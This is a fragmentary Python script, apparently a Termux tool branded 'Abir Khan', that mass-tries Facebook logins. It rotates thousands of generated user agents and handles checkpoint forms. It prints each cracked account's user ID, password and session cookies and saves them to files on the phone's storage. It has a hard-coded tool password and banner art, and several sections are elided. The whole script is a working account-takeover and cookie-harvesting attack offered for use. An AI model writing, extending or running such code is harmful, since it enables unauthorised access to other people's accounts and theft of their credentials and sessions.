...
def login():
  os.system('clear')
  print(logo4)
  passw=str(input(" \033[1;97m [•] Enter Tools Password: "))
  print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
  if passw=="DARK-ABIR":
    print("\033[1;97m  [•] Password Correct")
    time.sleep(1)
    menu()
    pass
  else:
    print("\033[1;97m  [•] Password Wrong")
    print("  [•] Follow my FB Account  For Password")
...
for x in range(5000):
    ...
    ugen.append(uaku2)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;<💚Abir Khan💚>\x07')
...
.....''''..........,:ld;
 ...
 / / | | | | '_ \ / _ \ '__|  //_\\| '_ \| | '__|
/ /__| |_| | |_) |  __/ |    /  _  \ |_) | | |   
\____/\__, |_.__/ \___|_|    \_/ \_/_.__/|_|_|   
      |___/
                                                                    
" | lolcat
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A}[{R}={A}] {G}FACEBOOK   {R} >>   {A}Abir Khan
{A}[{R}={A}] {G}STATUS      {R}>>   {A}RANDOM
{A}[{R}={A}] {G}VERSION   {R}  >>    {A}🥱🌸
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ NAME ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL METHOD ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#        
        ...
        for x in range(lim):
            self.loop += 1
            sys.stdout.write(f'\r\r{A}[{G}Abir-AUTO{A}] >> {A}[{R}{self.loop}{A}]{R} >> {A}[{G}OK{A}•{G}{len(ok)}{A}]')
            sys.stdout.flush()
                        ...
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {'method': 'post'}):
                            if 'confirmation_event_location=cliff' in str(x):
                                ...
                                if 'checkpoint' in rex.url:
                                    ...
                                    cok = self.ses.cookies.get_dict()
                                    print(f'\r\x1b[38;5;46m{A}[{G}Abir-OK💉{A}]{G} '+cok['c_user']+' | '+passw+'')
                                    print(f'\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} '+coki)
                                    linex()
                                    open("/sdcard/Abir-AUTO-COOKIE.txt","a").write(cok['c_user']+"|"+passw+"|"+coki+"\n")
                                    open('/sdcard/Abir-AUTO-UID.txt','a').write(cok['c_user']+'|'+passw+'\n')
